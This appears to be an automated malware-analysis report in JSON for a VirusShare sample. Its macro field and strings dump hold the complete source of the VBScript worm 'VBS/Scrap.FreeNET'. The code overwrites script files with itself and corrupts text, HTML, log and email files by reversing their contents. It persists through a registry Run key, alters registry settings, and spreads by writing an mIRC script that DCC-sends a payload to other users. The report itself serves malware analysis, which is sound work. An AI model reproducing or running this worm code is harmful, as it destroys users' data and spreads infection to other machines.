{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "StrReverse": "May attempt to obfuscate specific str",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "'Name  : VBS/Scrap.FreeNET\n'Author: Total K\n'Origin: UK\n'\n'Greets go out to: NocternaL, Drakatania, Coded HavIK and the UEE.\n'\nOn Error Resume Next\nRandomize\nDim T,R,W1,F1,D1,X\nT=\"Total Konfuzion\"\nR=\"VBS/Scrap.FreeNET\"\nSet W1=CreateObject(\"WScript.Shell\")\nIf Day(Now()=1) Or Day(Now()=18) Or Day(Now()=21) Then\nIf Int((2*Rnd)+1)=1 Then WScript.Echo \"..:: FreeNET by: \"&T&\" ::..\"\nEnd If\nIf Day(Now()=9) Then\nIf Int((20*Rnd)+1)=1 then W1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDesktop\",1,\"REG_DWORD\"\nEnd If\nW1.RegWrite\"HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\\",\"niB elcyceR\"\nW1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\",T\nW1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\",R\nSet F1=CreateObject(\"Scripting.FileSystemObject\")\nSet D1=F1.GetSpecialFolder(0)\nSet X=F1.GetFile(WScript.ScriptFullName)\nX.Copy D1&\"\\FNT.drv.vbs\"\nF1.CopyFile \"FreeNET.TXT.shs\",D1&\"\\FreeNET.TXT.shs\"\nCall GetFolder(D1)\nCall GetFolder(D1&\"\\Desktop\")\nCall GetFolder(\"C:\\My Documents\")\nCall GetFolder(D1&\"\\Web\")\nCall GetFolder(D1&\"\\Web\\Wallpaper\")\nCall GetFolder(D1&\"\\Help\")\nCall GetFolder(D1&\"\\Temp\")\nCall GetFolder(\"C:\\Program Files\\Internet Explorer\\Connection Wizard\")\nCall GetFolder(\"C:\\Program Files\\Microsoft Office\\Office\\Headers\")\nCall GetFolder(\"C:\\Inetpub\\wwwroot\")\nCall FreeNET(D1&\"\\FreeNET_List.txt\")\nSub GetFolder(IP)\nOn Error Resume Next\nIf F1.FolderExists(IP) Then\nDo\nSet F2=F1.GetFolder(IP)\nIP=F1.GetParentFolderName(IP)\nSet F3=F2.Files\nFor Each T1 In F3\nEN=LCase(F1.GetExtensionName(T1.Name))\nIf EN=\"vbs\" Then\nSet F4=F1.OpenTextFile(WScript.ScriptFullName,1)\nFS=F4.Size\nFC=F4.Read(FS)\nF4.Close()\nSet F4.OpenTextFile(T1.Name,2)\nF4.Write(FC)\nF4.Close()\nElse\nIf EN=\"txt\" Or EN=\"html\" Or EN=\"htm\" Or EN=\"log\" Or EN=\"asp\" Or EN=\"eml\" Then\nSet F4=F1.OpenTextFile(T1.Path,1,False)\nIf F4.ReadLine<>R&\" by: \"&T Then\nF4.Close()\nGetFile(T1.Path)\nElse\nF4.Close()\nEnd If\nEnd If\nNext\nLoop Until F3.IsRootFolder=True\nEnd If\nEnd Sub\nSub GetFile(GFN)\nSet F4=F1.GetFile(GFN)\nF4.Attributes=0\nFS=F4.Size\nSet F4=F1.OpenTextFile(GFN,1,False)\nFC=F4.Read(FS)\nF4.Close()\nSet F4=F1.OpenTextFile(GFN,2,False)\nF4.WriteLine(R&\" by: \"&T)\nB=StrReverse(FC)\nF4.Write(B)\nF4.Close()\nEnd Sub\nSub FreeNET(FN)\nIf Not (F1.FileExists(D1&\"\\FreeNET_List.txt\")) Then\nSet F4=F1.CreateTextFile(FN,2,False)\nF4.WriteLine(\"-=( FreeNET Access )=-\")\nF4.WriteBlankLines(2)\nF4.WriteLine(\"BT Internet         -   http://www.btinternet.com\")\nF4.WriteLine(\"AltaVista           -   http://www.altavista.com\")\nF4.WriteLine(\"X-Stream            -   http://www.x-stream.co.uk\")\nF4.Close()\nW1.Run(FN)\nEnd If\nEnd Sub\nDim M1\nIf (F1.FileExists(\"C:\\mIRC\\mIRC.ini\")) Then\nSet M1=F1.CreateTextFile(\"C:\\mIRC\\script.ini\")\nM1.WriteLine(\"[script]\")\nM1.WriteLine(\";VBS/Scrap.FreeNET by: Total Konfuzion\")\nM1.WriteLine(\";\")\nM1.WriteLine(\"n0=on 1:JOIN:#:{\")\nM1.WriteLine(\"n1= /if ( $nick == $me ) { halt }\")\nM1.WriteLine(\"n2= /.dcc send $nick \"&D1&\"\\FreeNET.TXT.shs\")\nM1.WriteLine(\"n3=}\")\nM1.Close()\nEnd If\nDim S\nI=\"\"\nI=W1.RegRead(\"HKEY_CLASSES_ROOT\\\"&W1.RegRead(\"HKEY_CLASSES_ROOT\\.txt\")&\"\\DefaultIcon\\\")\nIf I<>\"\" Then W1.RegWrite\"HKEY_CLASSES_ROOT\\ShellScrap\\DefaultIcon\",I\nW1.RegWrite\"HKEY_CLASSES_ROOT\\txtfile\\AlwaysShowExt\",\"\"\nW1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FreeNET\",\"WScript.exe \"&D1&\"\\FNT.drv.vbs\""
    },
    "filename": "VirusShare_e82da1ca5ea9c25a35a75c70bdfd3091",
    "filesize": 3540,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "e82da1ca5ea9c25a35a75c70bdfd3091",
        "sha1": "d0f0b203e0019559010f7a1bd42db438a11e2f09",
        "sha256": "0b3440d8059c2e18138c99e9e7eb86e059851d3661983a5b22eb72a25b42b1d6"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'Name  : VBS/Scrap.FreeNET",
            "'Author: Total K",
            "'Origin: UK",
            "'Greets go out to: NocternaL, Drakatania, Coded HavIK and the UEE.",
            "On Error Resume Next",
            "Randomize",
            "Dim T,R,W1,F1,D1,X",
            "T=\"Total Konfuzion\"",
            "R=\"VBS/Scrap.FreeNET\"",
            "Set W1=CreateObject(\"WScript.Shell\")",
            "If Day(Now()=1) Or Day(Now()=18) Or Day(Now()=21) Then",
            "If Int((2*Rnd)+1)=1 Then WScript.Echo \"..:: FreeNET by: \"&T&\" ::..\"",
            "End If",
            "If Day(Now()=9) Then",
            "If Int((20*Rnd)+1)=1 then W1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDesktop\",1,\"REG_DWORD\"",
            "End If",
            "W1.RegWrite\"HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\\",\"niB elcyceR\"",
            "W1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\",T",
            "W1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\",R",
            "Set F1=CreateObject(\"Scripting.FileSystemObject\")",
            "Set D1=F1.GetSpecialFolder(0)",
            "Set X=F1.GetFile(WScript.ScriptFullName)",
            "X.Copy D1&\"\\FNT.drv.vbs\"",
            "F1.CopyFile \"FreeNET.TXT.shs\",D1&\"\\FreeNET.TXT.shs\"",
            "Call GetFolder(D1)",
            "Call GetFolder(D1&\"\\Desktop\")",
            "Call GetFolder(\"C:\\My Documents\")",
            "Call GetFolder(D1&\"\\Web\")",
            "Call GetFolder(D1&\"\\Web\\Wallpaper\")",
            "Call GetFolder(D1&\"\\Help\")",
            "Call GetFolder(D1&\"\\Temp\")",
            "Call GetFolder(\"C:\\Program Files\\Internet Explorer\\Connection Wizard\")",
            "Call GetFolder(\"C:\\Program Files\\Microsoft Office\\Office\\Headers\")",
            "Call GetFolder(\"C:\\Inetpub\\wwwroot\")",
            "Call FreeNET(D1&\"\\FreeNET_List.txt\")",
            "Sub GetFolder(IP)",
            "On Error Resume Next",
            "If F1.FolderExists(IP) Then",
            "Set F2=F1.GetFolder(IP)",
            "IP=F1.GetParentFolderName(IP)",
            "Set F3=F2.Files",
            "For Each T1 In F3",
            "EN=LCase(F1.GetExtensionName(T1.Name))",
            "If EN=\"vbs\" Then",
            "Set F4=F1.OpenTextFile(WScript.ScriptFullName,1)",
            "FS=F4.Size",
            "FC=F4.Read(FS)",
            "F4.Close()",
            "Set F4.OpenTextFile(T1.Name,2)",
            "F4.Write(FC)",
            "F4.Close()",
            "Else",
            "If EN=\"txt\" Or EN=\"html\" Or EN=\"htm\" Or EN=\"log\" Or EN=\"asp\" Or EN=\"eml\" Then",
            "Set F4=F1.OpenTextFile(T1.Path,1,False)",
            "If F4.ReadLine<>R&\" by: \"&T Then",
            "F4.Close()",
            "GetFile(T1.Path)",
            "Else",
            "F4.Close()",
            "End If",
            "End If",
            "Next",
            "Loop Until F3.IsRootFolder=True",
            "End If",
            "End Sub",
            "Sub GetFile(GFN)",
            "Set F4=F1.GetFile(GFN)",
            "F4.Attributes=0",
            "FS=F4.Size",
            "Set F4=F1.OpenTextFile(GFN,1,False)",
            "FC=F4.Read(FS)",
            "F4.Close()",
            "Set F4=F1.OpenTextFile(GFN,2,False)",
            "F4.WriteLine(R&\" by: \"&T)",
            "B=StrReverse(FC)",
            "F4.Write(B)",
            "F4.Close()",
            "End Sub",
            "Sub FreeNET(FN)",
            "If Not (F1.FileExists(D1&\"\\FreeNET_List.txt\")) Then",
            "Set F4=F1.CreateTextFile(FN,2,False)",
            "F4.WriteLine(\"-=( FreeNET Access )=-\")",
            "F4.WriteBlankLines(2)",
            "F4.WriteLine(\"BT Internet         -   http://www.btinternet.com\")",
            "F4.WriteLine(\"AltaVista           -   http://www.altavista.com\")",
            "F4.WriteLine(\"X-Stream            -   http://www.x-stream.co.uk\")",
            "F4.Close()",
            "W1.Run(FN)",
            "End If",
            "End Sub",
            "Dim M1",
            "If (F1.FileExists(\"C:\\mIRC\\mIRC.ini\")) Then",
            "Set M1=F1.CreateTextFile(\"C:\\mIRC\\script.ini\")",
            "M1.WriteLine(\"[script]\")",
            "M1.WriteLine(\";VBS/Scrap.FreeNET by: Total Konfuzion\")",
            "M1.WriteLine(\";\")",
            "M1.WriteLine(\"n0=on 1:JOIN:#:{\")",
            "M1.WriteLine(\"n1= /if ( $nick == $me ) { halt }\")",
            "M1.WriteLine(\"n2= /.dcc send $nick \"&D1&\"\\FreeNET.TXT.shs\")",
            "M1.WriteLine(\"n3=}\")",
            "M1.Close()",
            "End If",
            "Dim S",
            "I=\"\"",
            "I=W1.RegRead(\"HKEY_CLASSES_ROOT\\\"&W1.RegRead(\"HKEY_CLASSES_ROOT\\.txt\")&\"\\DefaultIcon\\\")",
            "If I<>\"\" Then W1.RegWrite\"HKEY_CLASSES_ROOT\\ShellScrap\\DefaultIcon\",I",
            "W1.RegWrite\"HKEY_CLASSES_ROOT\\txtfile\\AlwaysShowExt\",\"\"",
            "W1.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FreeNET\",\"WScript.exe \"&D1&\"\\FNT.drv.vbs\""
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.altavista.com",
            "http://www.x-stream.co.uk",
            "http://www.btinternet.com"
        ]
    },
    "time": "0:00:00.301042",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
